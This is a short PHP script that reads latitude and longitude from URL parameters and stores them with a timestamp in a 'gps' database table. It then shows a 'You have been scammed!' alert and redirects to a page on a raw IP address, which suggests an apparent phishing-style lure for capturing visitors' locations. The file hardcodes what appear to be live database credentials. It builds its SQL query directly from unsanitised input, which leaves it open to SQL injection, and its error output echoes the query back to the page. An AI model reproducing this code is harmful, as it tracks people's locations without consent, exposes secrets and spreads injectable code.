<?php
// Database credentials
$host = '127.0.0.1'; // Use this for database host
$db_username = 'amarnat2_balaji'; // Replace with your database username
$db_password = 'RshRsh@#2407'; // Replace with your database password
$db_database = 'amarnat2_dairy'; // Replace with your database name

$latitude = $_GET['lat'];
$longitude = $_GET['long'];
$time = date("Y-m-d H:i:s"); // Capture the current time

// Establish database connection
$conn = mysqli_connect($host, $db_username, $db_password, $db_database);

// Check connection
if (!$conn) {
    die("Database connection failed: " . mysqli_connect_error());
}

$sql = "INSERT INTO gps (latitude, longitude, time) VALUES ('$latitude', '$longitude', '$time')";

if ($conn->query($sql) === TRUE) {
    echo "<script>alert('You have been scammed! Don’t open such links that contain messages to lure you into their trap.'); window.location.href = 'https://103.180.120.26/~amarnat2/public_html/ajayr/latitude.php';</script>";
} else {
    echo "Error: " . $sql . "<br>" . $conn->error;
}

$conn->close();
?>
